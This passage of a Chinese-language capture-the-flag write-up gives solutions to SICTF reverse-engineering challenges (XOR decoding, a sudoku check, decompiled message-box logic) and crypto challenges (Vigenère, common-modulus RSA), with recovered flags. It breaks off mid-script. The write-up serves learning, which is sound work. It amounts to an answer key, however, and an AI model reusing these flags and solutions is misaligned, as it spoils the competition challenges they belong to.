class="comment">#SICTF&#123;4e474b8a-9df6-454b-9ea6-d4f5e37cd51f&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ez-pyc">ez_pyc</h3><p>分析逻辑可知，是求解一个数独，同时只要求其中的一个解</p><p>尝试放到网上直接求解，直接出来了</p><p><img src="https://s2.loli.net/2024/02/23/yepYRodIr564mOT.png" alt="image-20240223163033222"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2548656723194376198518245679931748649825721856943342156965374812</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/23/UEgNoFqBv1CbdZm.png" alt="image-20240223163250217"></p><blockquote><p>这里我把输入改成十进制了</p></blockquote><p>之后更新一个碰撞md5的方法</p><h3 id="Sweet-Tofu">Sweet_Tofu</h3><p>动调直接找检查数组，判断时要异或0x66</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">a = [<span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x1D</span>, <span class="number">0x3F</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, </span><br><span class="line">     <span class="number">0x39</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x39</span>, <span class="number">0x2F</span>, <span class="number">0x39</span>, <span class="number">0x21</span>, </span><br><span class="line">     <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x41</span>, <span class="number">0x15</span>, <span class="number">0x39</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0x03</span>, </span><br><span class="line">     <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x09</span>, </span><br><span class="line">     <span class="number">0x08</span>, <span class="number">0x41</span>, <span class="number">0x12</span>, <span class="number">0x39</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x39</span>, <span class="number">0x15</span>, </span><br><span class="line">     <span class="number">0x03</span>, <span class="number">0x14</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x15</span>, <span class="number">0x47</span>, <span class="number">0x1B</span>]</span><br><span class="line"></span><br><span class="line">pxor(a,<span class="number">0x66</span>)</span><br><span class="line"><span class="comment">#flag&#123;You_and_I_God&#x27;s_Creation!Don&#x27;t_be_serious!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="artbreaker">artbreaker</h3><p>ida打开后发现不能反编译也不能看流程，修改最大节点数量然后跳到流程图</p><p>结果</p><p><img src="https://s2.loli.net/2024/02/23/zvDxTWEJqRoksOM.png" alt="image-20240223164916217"></p><p>居然用流程图把flag画出来了,看未定义变量的wp，说是用了**<a href="https://github.com/JuliaPoo/Artfuscator">Artfuscator</a>**这个来画的画</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Rabbit_falls_into_rabbit_hole&#125;</span></span><br></pre></td></tr></table></figure><h3 id="BattleCity">BattleCity</h3><p>游戏题，看样子是要通关，在assets中可以看到levels.ldtk文件，用文本文件编辑器打开可以发现里面有各种东西的属性，于是我把每一关的敌人只留了一个，然后把基地的长宽改成0，打完4关，assets里出现了win.png，是二维码，扫码就出来了</p><h3 id="closeme">closeme</h3><p>提示是要用正常方式结束程序</p><p>由于程序一直弹出窗口，因此需要通过messagebox函数的交叉引用找到主函数。或者通过动态调试找到位置。</p><p>然后动调分析一下，发现是一个循环+一些东西，要结束的话只能先break，在205行有唯一的break。同时后面有一个goto，让执行流又回到label_4了，这就</p><p>（看了wp）发现下面有一个xor加密的hint，解密得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">a=[<span class="number">0x23</span>, <span class="number">0x11</span>, <span class="number">0x0D</span>, <span class="number">0x1B</span>, <span class="number">0x13</span>, <span class="number">0x4B</span>, <span class="number">0x18</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x0A</span>, <span class="number">0x50</span>, <span class="number">0x08</span>, <span class="number">0x1D</span>, <span class="number">0x06</span>, <span class="number">0x54</span>, <span class="number">0x16</span>, <span class="number">0x1A</span>, <span class="number">0x18</span>, <span class="number">0x0B</span>, <span class="number">0x1C</span>, <span class="number">0x5A</span>, <span class="number">0x0F</span>, <span class="number">0x14</span>, <span class="number">0x18</span>, <span class="number">0x5E</span>, <span class="number">0x12</span>, <span class="number">0xE5</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0xE3</span>, <span class="number">0xE0</span>, <span class="number">0xE4</span>, <span class="number">0xE8</span>, <span class="number">0xF0</span>, <span class="number">0xA9</span>, <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0xAC</span>, <span class="number">0xEE</span>, <span class="number">0xE2</span>, <span class="number">0xE6</span>, <span class="number">0xF3</span>, <span class="number">0xFA</span>, <span class="number">0xB2</span>, <span class="number">0xF3</span>, <span class="number">0xCD</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xF7</span>, <span class="number">0xB8</span>, <span class="number">0xF6</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0xFC</span>, <span class="number">0xD3</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0x8C</span>, <span class="number">0x81</span>, <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0x84</span>, <span class="number">0xD2</span>, <span class="number">0xCF</span>, <span class="number">0xCB</span>, <span class="number">0xC4</span>, <span class="number">0x89</span>, <span class="number">0xC8</span>, <span class="number">0xCE</span>, <span class="number">0x8C</span>, <span class="number">0xDE</span>, <span class="number">0xDA</span>, <span class="number">0xC0</span>, <span class="number">0xC2</span>, <span class="number">0xD4</span>, <span class="number">0xD6</span>, <span class="number">0x9D</span>, <span class="number">0x94</span>, <span class="number">0xFF</span>, <span class="number">0xC3</span>, <span class="number">0xC4</span>, <span class="number">0xCC</span>, <span class="number">0x99</span>, <span class="number">0xD9</span>, <span class="number">0xD3</span>, <span class="number">0xD3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0xDA</span>, <span class="number">0xE0</span>, <span class="number">0x98</span>, <span class="number">0xA7</span>, <span class="number">0xB0</span>, <span class="number">0xEB</span>, <span class="number">0x8B</span>, <span class="number">0xA9</span>, <span class="number">0xEF</span>, <span class="number">0xF9</span>, <span class="number">0xE6</span>, <span class="number">0xFA</span>, <span class="number">0xE2</span>, <span class="number">0xEC</span>, <span class="number">0xA4</span>, <span class="number">0xA0</span>, <span class="number">0xEF</span>, <span class="number">0xB1</span>, <span class="number">0xF1</span>, <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB7</span>, <span class="number">0xBE</span>, <span class="number">0xB6</span>, <span class="number">0xF9</span>, <span class="number">0xB5</span>, <span class="number">0xA9</span>, <span class="number">0xB8</span>, <span class="number">0xB8</span>, <span class="number">0xAC</span>, <span class="number">0xFF</span>, <span class="number">0x97</span>, <span class="number">0x89</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x8C</span>, <span class="number">0xC5</span>, <span class="number">0x8F</span>, <span class="number">0x94</span>, <span class="number">0xC8</span>, <span class="number">0x9D</span>, <span class="number">0x82</span>, <span class="number">0x8E</span>, <span class="number">0xCC</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x8E</span>, <span class="number">0x97</span>, <span class="number">0xDD</span>, <span class="number">0xD2</span>, <span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x96</span>, <span class="number">0x9E</span>, <span class="number">0xD7</span>, <span class="number">0x99</span>, <span class="number">0x8A</span>, <span class="number">0xDA</span>, <span class="number">0xCB</span>, <span class="number">0xCD</span>, <span class="number">0xCD</span>, <span class="number">0xCE</span>, <span class="number">0xCE</span>,<span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x2D</span>, <span class="number">0x24</span>, <span class="number">0x55</span>, <span class="number">0x6A</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x6F</span>, <span class="number">0x2B</span>, <span class="number">0x7F</span>, <span class="number">0x78</span>, <span class="number">0x6C</span>, <span class="number">0x62</span>, <span class="number">0x79</span>, <span class="number">0x65</span>, <span class="number">0x32</span>, <span class="number">0x75</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x71</span>, <span class="number">0x37</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x73</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x3D</span>, <span class="number">0x6A</span>, <span class="number">0x77</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0x44</span>, <span class="number">0x4C</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x53</span>, <span class="number">0x08</span>, <span class="number">0x45</span>, <span class="number">0x43</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x0D</span>, <span class="number">0x4E</span>, <span class="number">0x7C</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x4F</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x08</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x40</span>, <span class="number">0x5E</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i] ^= i+<span class="number">102</span></span><br><span class="line">pl(a)</span><br><span class="line"><span class="comment">#Every time you close the messagebox by click `Yes` or `No`, it will be stored. Just choose Yes/No(1/0) in a certain order which is the flag, such as 01001100. Please submit flag which the format like `SICTF&#123;01001100&#125;`</span></span><br></pre></td></tr></table></figure><p>那么根据上面的break，可以看出需要输入16次</p><p>但是要检测到按键按的是哪个</p><p>根据messageboxW：yes是6，no是7。查找后可以发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 == <span class="number">5</span> * (v2 / <span class="number">5</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v63 = (<span class="type">const</span> WCHAR *)&amp;unk_140022B10;</span><br><span class="line">        v64 = (__int64)&amp;unk_140022B3C;</span><br><span class="line">        LOWORD(Size) = <span class="number">0</span>;</span><br><span class="line">        LODWORD(v66) = <span class="number">1</span>;</span><br><span class="line">        sub_140003240(&amp;v70, &amp;v63);</span><br><span class="line">        lpWindowName = v71;</span><br><span class="line">        v63 = (<span class="type">const</span> WCHAR *)&amp;unk_140022B3C;</span><br><span class="line">        v64 = (__int64)&amp;unk_140022B5D;</span><br><span class="line">        LOWORD(Size) = <span class="number">0</span>;</span><br><span class="line">        LODWORD(v66) = <span class="number">1</span>;</span><br><span class="line">        sub_140003240(lpCaption, &amp;v63);</span><br><span class="line">        v73 = (<span class="type">unsigned</span> __int64)lpCaption[<span class="number">1</span>];</span><br><span class="line">        choose = MessageBoxW(<span class="number">0</span>i64, lpWindowName, lpCaption[<span class="number">1</span>], <span class="number">4u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( lpCaption[<span class="number">0</span>] )</span><br><span class="line">          sub_1400038E0(v73, <span class="number">2</span> * (__int64)lpCaption[<span class="number">0</span>], <span class="number">2</span>i64);</span><br><span class="line">        <span class="keyword">if</span> ( v70 )</span><br><span class="line">          sub_1400038E0(lpWindowName, <span class="number">2</span>i64 * (_QWORD)v70, <span class="number">2</span>i64);</span><br><span class="line">        this_choose_ans = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( choose != <span class="number">6</span> )                      <span class="comment">// 否</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( choose != <span class="number">7</span> )                    <span class="comment">// 否，不可能进入</span></span><br><span class="line">          &#123;</span><br><span class="line">            v63 = (<span class="type">const</span> WCHAR *)&amp;off_140022B98;</span><br><span class="line">            v64 = <span class="number">1</span>i64;</span><br><span class="line">            Size = (<span class="type">size_t</span>)&amp;off_140022888;</span><br><span class="line">            v66 = <span class="number">0</span>i64;</span><br><span class="line">            sub_1400214A0(&amp;v63, &amp;off_140022BA8);</span><br><span class="line">          &#125;</span><br><span class="line">          this_choose_ans = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cont2 = cont;                           <span class="comment">// 是</span></span><br><span class="line">        <span class="keyword">if</span> ( cont == v59 )                      <span class="comment">// ?</span></span><br><span class="line">        &#123;</span><br><span class="line">          sub_140003820(&amp;v59);</span><br><span class="line">          cont2 = cont;</span><br><span class="line">        &#125;</span><br><span class="line">        *(_BYTE *)(save_place + cont2) = this_choose_ans;</span><br><span class="line">        <span class="keyword">if</span> ( ++cont == <span class="number">16</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>修正this_choose_ans的值，是==1，否==0,最后存在save_place中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">sp0 = *(<span class="type">unsigned</span> __int8 *)save_place;</span><br><span class="line"><span class="keyword">if</span> ( sp0 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp1 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp1 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp2 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp2 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp3 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp3 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp4 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp4 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp5 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp5 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp6 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">6</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp6 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp7 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">7</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp7 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp8 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp8 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp9 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">9</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp9 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp10 = (LPCWSTR)*(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)sp10 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp11 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">11</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp11 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp12 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">12</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp12 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp13 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">13</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp13 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp14 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">14</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp14 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">sp15 = *(<span class="type">unsigned</span> __int8 *)(save_place + <span class="number">15</span>);</span><br><span class="line"><span class="keyword">if</span> ( sp15 &gt; <span class="number">1</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">final = sp0</span><br><span class="line">      + <span class="number">10</span></span><br><span class="line">      * (sp1</span><br><span class="line">       + <span class="number">10</span></span><br><span class="line">       * (sp2</span><br><span class="line">        + <span class="number">10</span></span><br><span class="line">        * (sp3</span><br><span class="line">         + <span class="number">10</span></span><br><span class="line">         * (sp4</span><br><span class="line">          + <span class="number">10</span></span><br><span class="line">          * (sp5</span><br><span class="line">           + <span class="number">10</span></span><br><span class="line">           * (sp6</span><br><span class="line">            + <span class="number">10</span></span><br><span class="line">            * (sp7</span><br><span class="line">             + <span class="number">10</span></span><br><span class="line">             * (sp8</span><br><span class="line">              + <span class="number">10</span> * (sp9 + <span class="number">10</span>i64 * (_QWORD)&amp;sp10[<span class="number">50000</span> * sp15 + <span class="number">5000</span> * sp14 + <span class="number">500</span> * sp13 + <span class="number">50</span> * sp12 + <span class="number">5</span> * sp11])))))))));</span><br></pre></td></tr></table></figure><p>经过这里后label_4会到第一个while（1）的位置最后,那只能继续分析final，它储存了所有输入内容计算后的最终值，由于先输入sp0，然后1。。。说明高位后输入，低位先输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_14001F580(&amp;final, &amp;zero) )</span><br></pre></td></tr></table></figure><p>并且由于提示的按一定方式点击，说明肯定有检测的存在</p><p>在label_3的位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (what &amp; <span class="number">0xFFFF0000</span>) != <span class="number">-1443823616</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_3:</span><br><span class="line">    cont = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>只要等于就可以往后走</p><p>反异或一下what的值等于1443758080/560E 0000</p><p>动态调试，输入测试，发现sp0到15就是放入的值1010101，唯一奇怪的是sp13和sp11是特定的值0x800和0x90000000</p><p><s>继续看what的生成</s>看不出来，试试代数据</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1111 </span><span class="number">1111 </span><span class="number">0000 </span><span class="number">0000</span> <span class="string">》</span>           <span class="number">1111 </span><span class="number">1111 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111</span> <span class="string">》</span> <span class="number">0011 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1100 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000 </span><span class="number">0000 </span><span class="number">1111 </span><span class="number">1111</span> <span class="string">》</span> <span class="number">0011 </span><span class="number">1111 </span><span class="number">1100 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">1001 </span><span class="number">1001 </span><span class="number">1001 </span><span class="number">1001</span> <span class="string">》</span> <span class="number">0110 </span><span class="number">0110 </span><span class="number">0110 </span><span class="number">0110 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br></pre></td></tr></table></figure><p>根据第一组数据感觉是倒序排入，上面final也是倒序的。倒序一下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000 </span><span class="number">0000 </span><span class="number">1111 </span><span class="number">1111</span> <span class="string">》</span>           <span class="number">1111 </span><span class="number">1111 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">1111 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">0000</span> <span class="string">》</span> <span class="number">0011 </span><span class="number">1111 </span><span class="number">1111 </span><span class="number">1100 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">1111 </span><span class="number">1111 </span><span class="number">0000 </span><span class="number">0000</span> <span class="string">》</span> <span class="number">0011 </span><span class="number">1111 </span><span class="number">1100 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br><span class="line"></span><br><span class="line"><span class="number">1001 </span><span class="number">1001 </span><span class="number">1001 </span><span class="number">1001</span> <span class="string">》</span> <span class="number">0110 </span><span class="number">0110 </span><span class="number">0110 </span><span class="number">0110 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000 </span><span class="number">0000</span></span><br></pre></td></tr></table></figure><p>第四个看得很明显如果不看后4位是最后两个变到了前面</p><p>试一试最后的what是不是这样变的</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">560e0000</span>：</span><br><span class="line"><span class="number">0101011000001110</span></span><br><span class="line"><span class="number">0101100000111001</span></span><br><span class="line"><span class="symbol">0101 </span><span class="number">1000</span> <span class="number">0011</span> <span class="number">1001</span></span><br></pre></td></tr></table></figure><p>不对？重新看了一遍发现是与运算，不是异或，那就是说最后的A9F1就是结果的末值</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1010 </span><span class="number">1001 </span><span class="number">1111 </span><span class="number">0001</span></span><br><span class="line"><span class="number">1010 </span><span class="number">0111 </span><span class="number">1100 </span><span class="number">0110</span></span><br><span class="line"><span class="number">0110 </span><span class="number">0011 </span><span class="number">1110 </span><span class="number">0101</span></span><br><span class="line"><span class="string">得到</span></span><br><span class="line"><span class="string">SICTF&#123;0110001111100101&#125;</span></span><br></pre></td></tr></table></figure><p>这道题告诉我看到这种抽象的题要多调试，静下来分析QAQ</p><h3 id="virus-nlys1s-待补充">virus-nlys1s[待补充]</h3><p>居然是病毒样本，没玩过，之后再说</p><hr><h2 id="CRYPTO">CRYPTO</h2><h3 id="vigenere">vigenere</h3><p>从名字可以看出是维吉尼亚密码</p><p>第二段可以明显看出有一段是SICTF{}，进入</p><p><a href="https://www.dcode.fr/vigenere-cipher%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E8%BE%93%E5%85%A5%E5%AF%86%E6%96%87%E5%92%8C%E5%B7%B2%E7%9F%A5%E7%9A%84%E6%98%8E%E6%96%87">https://www.dcode.fr/vigenere-cipher这个网站，输入密文和已知的明文</a></p><p>得key：SAATF和明文</p><h3 id="SuperbRSA">SuperbRSA</h3><p>这个是变体的共模攻击</p><p>通过e1，e2求gcd，最后的结果要取gcd的根</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1=<span class="number">55</span></span><br><span class="line">e2=<span class="number">200</span></span><br><span class="line">n= <span class="number">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></span><br><span class="line">c1= <span class="number">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></span><br><span class="line">c2= <span 